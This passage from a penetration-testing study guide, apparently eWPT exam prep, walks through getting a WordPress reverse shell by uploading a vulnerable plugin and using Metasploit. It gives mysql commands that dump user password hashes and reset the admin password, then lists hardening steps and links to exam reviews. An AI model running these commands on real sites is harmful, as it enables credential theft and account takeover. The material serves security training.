Access it and you will see the URL to execute the reverse shell: 
 
Uploading and activating malicious plugin 
(This part is copied from https://www.hackingarticles.in/wordpress-reverse-shell/) 
Some time logon users do not own writable authorization to make modifications to the 
WordPress theme, so we choose “Inject WP pulgin malicious” as an alternative strategy to 
acquiring a web shell. 
[[ PAGE 367 ]]
So, once you have access to a WordPress dashboard, you can attempt installing a malicious 
plugin. Here I’ve already downloaded the vulnerable plugin from exploit db. 
Click here to download the plugin for practice. 
 
Since we have zip file for plugin and now it’s time to upload the plugin. 
Dashboard > plugins > upload plugin 
 
Browse the downloaded zip file as shown. 
[[ PAGE 368 ]]
 
Once the package gets installed successfully, we need to activate the plugin. 
 
When everything is well setup then go for exploiting. Since we have installed vulnerable plugin 
named “reflex-gallery” and it is easily exploitable. 
You will get exploit for this vulnerability inside Metasploit framework and thus load the below 
module and execute the following command: 
As the above commands are executed, you will have your meterpreter session. Just as 
portrayed in this article, there are multiple methods to exploit a WordPress platformed 
website. 
[[ PAGE 369 ]]
 
Post Exploitation 
Extract usernames and passwords: 
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select 
concat_ws(':', user_login, user_pass) from wp_users;" 
Change admin password: 
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE 
wp_users SET user_pass=MD5('hacked') WHERE ID = 1;" 
WordPress Protection 
Regular Updates 
Make sure WordPress, plugins, and themes are up to date. Also confirm that automated 
updating is enabled in wp-config.php: 
define( 'WP_AUTO_UPDATE_CORE', true ); 
add_filter( 'auto_update_plugin', '__return_true' ); 
add_filter( 'auto_update_theme', '__return_true' ); 
Also, only install trustable WordPress plugins and themes. 
Security Plugins 
• 
Wordfence Security 
• 
Sucuri Security 
• 
iThemes Security 
Other Recommendations 
• 
Remove default admin user 
• 
Use strong passwords and 2FA 
• 
Periodically review users permissions 
• 
Limit login attempts to prevent Brute Force attacks 
[[ PAGE 370 ]]
• 
Rename wp-admin.php file and only allow access internally or from certain IP 
addresses. 
https://github.com/carlospolop/hacktricks/blob/master/pentesting/pentesting-
web/wordpress.md 
eWPT Reviews 
https://www.linkedin.com/pulse/my-review-ewpt-elearnsecurity-joas-antonio/ 
https://github.com/CyberSecurityUP/eWPT-Preparation 
https://robertscocca.medium.com/%EF%B8%8Fewpt-review-the-g-932b1245e51a 
https://medium.com/@unt0uchable1/elearnsecurity-ewpt-review-and-tips-72f955f3670 
https://www.youtube.com/watch?v=FhIOeXMWWCw 
https://www.youtube.com/watch?v=Kul6HVORBzc 
https://h0mbre.github.io/eWPT/ 
https://sorsdev.com/2021/04/18/elearnsecuritys-ewpt-exam-review/ 
https://www.bencteux.fr/posts/ewpt/ 
https://kentosec.com/2020/06/25/elearnsecurity-web-application-penetration-tester-ewpt-
review/ 
https://bastijnouwendijk.com/my-journey-to-becoming-an-ewpt/ 
 
 
 
 
 
 
